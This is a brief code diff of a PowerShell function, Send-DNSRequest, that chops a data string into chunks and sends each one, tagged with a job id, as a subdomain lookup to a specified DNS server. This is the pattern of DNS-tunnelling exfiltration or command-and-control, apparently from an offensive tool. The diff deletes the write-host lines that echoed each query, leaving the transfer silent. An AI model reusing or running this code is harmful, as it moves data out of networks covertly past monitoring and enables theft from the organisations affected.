@@ -183,13 +183,11 @@ function Send-DNSRequest {
     for($i=0; $i-lt($repeat); $i++){
         $str = $data.Substring($i*$Split,$Split);
         $str = $jobid + $str + '.' + $dns;
-        write-host $str
         $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
     };
     if($remainder){
         $str = $data.Substring($len-$remainder);
         $str = $jobid + $str + '.' + $dns;
-        write-host $str
         $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
 
     };
